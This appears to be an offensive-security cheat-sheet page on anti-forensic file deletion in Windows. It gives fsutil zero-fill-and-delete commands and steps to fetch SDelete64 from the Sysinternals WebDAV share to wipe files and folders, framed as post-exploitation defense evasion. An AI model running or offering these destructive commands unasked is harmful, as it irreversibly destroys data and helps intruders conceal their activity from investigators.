---
author(s):
  - Userware
tags:
  - post-exploitation
  - defense-evasion
  - anti-forensics
  - living-off-the-land
  - T1070-004
  - windows
---
# Living off the Land

## 01 - Command Prompt

> [!INFO] Elevated Permissions Required
> It requires administrative privileges to overwrite the file.

```
C:\> fsutil.exe file setZeroData offset=0 length=524288 [<drive_letter>:\]path\to\file & del /f /q [<drive_letter>:\]path\to\file

C:\> fsutil.exe file setZeroData offset=0 length=9999999999 [<drive_letter>:\]path\to\file & del /f /q [<drive_letter>:\]path\to\file
```

## 02 - Sysinternals

### 2.1 - Copy File from WebDAV

#### 2.1.1 - Command Prompt

```
C:\> net.exe use z: \\live.sysinternals.com\tools

copy z:\SDelete64.exe .

net.exe use z: /delete
```

#### 2.1.2 - PowerShell

```
PS C:\> New-PSDrive -Name Z -PSProvider FileSystem -Root "\\live.sysinternals.com\tools"

PS C:\> Copy-Item z:\SDelete64.exe .

PS C:\> Remove-PSDrive -Name Z
```

Accept EULA

```
C:\> .\SDelete64.exe -accepteula
```

Delete folder.

```
C:\> .\SDelete64.exe -s -z [<drive_letter>:\]folder\
```

Delete file.

```
C:\> .\SDelete64.exe -p 50 [<drive_letter>:\]path\to\file.txt
```

---
## References

### LOLBAS

- [LOLBAS: fsutil](https://lolbas-project.github.io/lolbas/Binaries/Fsutil/)